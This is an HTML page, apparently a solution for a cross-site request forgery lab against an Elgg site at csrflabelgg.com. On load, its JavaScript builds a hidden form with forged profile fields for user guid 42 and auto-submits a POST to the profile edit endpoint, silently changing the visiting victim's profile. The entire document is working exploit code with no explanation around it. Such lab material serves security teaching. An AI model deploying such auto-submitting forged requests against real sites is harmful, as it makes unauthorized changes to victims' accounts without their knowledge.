```html
<html>
  <body>
    <h1>This page forges an HTTP POST request.</h1>
    <script type="text/javascript">
      function forge_post() {

        var fields;
        fields = "<input type='hidden' name='name' value='Alice'>";

        fields += "<input type='hidden' name='description' value='Neo is the One'>";
        fields += "<input type='hidden' name='accesslevel[description]' value='2'>";

        fields += "<input type='hidden' name='interests' value='CSRF'>";
        fields += "<input type='hidden' name='accesslevel[interests]' value='2'>";

        fields += "<input type='hidden' name='skills' value='fight crime at night'>";
        fields += "<input type='hidden' name='accesslevel[skills]' value='0'>";

        fields += "<input type='hidden' name='guid' value='42'>";

        var p = document.createElement("form");
        p.action = "http://www.csrflabelgg.com/action/profile/edit";
        p.innerHTML = fields;
        p.method = "post";
        document.body.appendChild(p);
        p.submit();
      }

      window.onload = function() { forge_post();}
    </script>
  </body>
</html>
```
